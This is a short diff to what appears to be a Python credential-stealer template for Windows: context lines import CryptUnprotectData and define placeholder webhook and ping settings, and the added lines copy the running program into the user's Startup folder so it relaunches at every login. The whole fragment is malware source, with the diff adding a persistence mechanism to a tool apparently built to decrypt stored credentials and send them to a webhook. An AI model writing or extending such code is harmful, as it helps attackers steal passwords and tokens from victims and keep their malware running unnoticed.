@@ -28,6 +28,15 @@ from win32crypt import CryptUnprotectData
 __WEBHOOK__ = "%webhook_here%"
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
+__STARTUP__ = "True"
+
+def startup():
+    startup_path = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+    shutil.copy(sys.argv[0], startup_path)
+if __STARTUP__ == "True":
+    startup()
+else:
+    pass
 
 def main(webhook: str):
     global embed
